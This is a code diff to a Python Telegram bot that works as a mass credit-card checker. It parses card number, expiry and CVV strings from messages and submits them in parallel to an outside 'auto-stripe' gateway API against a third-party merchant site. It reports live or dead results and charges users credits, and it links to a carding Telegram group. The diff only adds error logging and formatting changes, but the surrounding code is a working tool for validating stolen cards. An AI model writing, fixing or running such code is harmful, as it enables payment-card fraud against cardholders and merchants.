@@ -1803,7 +1803,7 @@ import logging
 from html import escape
 from telegram import Update
 from telegram.ext import ContextTypes
-from telegram.error import TelegramError
+from telegram.error import TelegramError, BadRequest
 from db import get_user, update_user
 from telegram.helpers import escape_markdown
 
@@ -1812,7 +1812,7 @@ API_URL_TEMPLATE = (
     "https://darkboy-auto-stripe-y6qk.onrender.com/"
     "gateway=massstripeauth/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
 )
-CONCURRENCY = 3  # check 3 cards in parallel
+CONCURRENCY = 3
 RATE_LIMIT_SECONDS = 5
 user_last_command_time = {}
 BULLET_GROUP_LINK = "https://t.me/CARDER33"
@@ -1830,7 +1830,6 @@ async def deduct_credit(user_id: int) -> bool:
 
 # --- HELPERS ---
 def extract_cards(text: str) -> list[str]:
-    """Extract cards in format 4444333322221111|MM|YY|CVV"""
     return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)
 
 async def check_single_card(session, card: str):
@@ -1840,7 +1839,6 @@ async def check_single_card(session, card: str):
         status = str(data.get("status", "unknown")).lower()
         response = escape(data.get("response", "No response"))
 
-        # Escape for MarkdownV2
         card_md = escape_markdown(card, version=2)
         response_md = escape_markdown(response, version=2)
 
@@ -1869,13 +1867,15 @@ async def run_mass_checker(msg, cards, user_id):
     gateway_text = escape_markdown("Gateway ➜ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵", version=2)
     status_text = escape_markdown("Status ➜ Checking 🔎...", version=2)
 
-    # Initial processing message
     initial_text = (
         "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳```\n"
         f"{bullet_link} {gateway_text}\n"
         f"{bullet_link} {status_text}\n"
     )
-    await msg.edit_text(initial_text, parse_mode="MarkdownV2", disable_web_page_preview=True)
+    try:
+        await msg.edit_text(initial_text, parse_mode="MarkdownV2", disable_web_page_preview=True)
+    except BadRequest as e:
+        logging.error(f"[editMessageText-init] BadRequest: {e.message}")
 
     queue = asyncio.Queue()
     semaphore = asyncio.Semaphore(CONCURRENCY)
@@ -1916,8 +1916,10 @@ async def run_mass_checker(msg, cards, user_id):
                 content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results[-20:])
                 try:
                     await msg.edit_text(content, parse_mode="MarkdownV2", disable_web_page_preview=True)
-                except TelegramError:
-                    pass
+                except BadRequest as e:
+                    logging.error(f"[editMessageText-update] BadRequest: {e.message}")
+                except TelegramError as e:
+                    logging.error(f"[editMessageText-update] TelegramError: {e}")
 
                 await asyncio.sleep(0.3)
 
@@ -1964,12 +1966,11 @@ async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         cards = cards[:30]
 
-    # Initial reply
+    # Initial reply (block code)
     msg = await update.message.reply_text(
-        "⏳ <b>Processing cards...</b>", parse_mode="HTML"
+        "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳```", parse_mode="MarkdownV2"
     )
 
-    # Run mass checker
     asyncio.create_task(run_mass_checker(msg, cards, user_id))
 
 
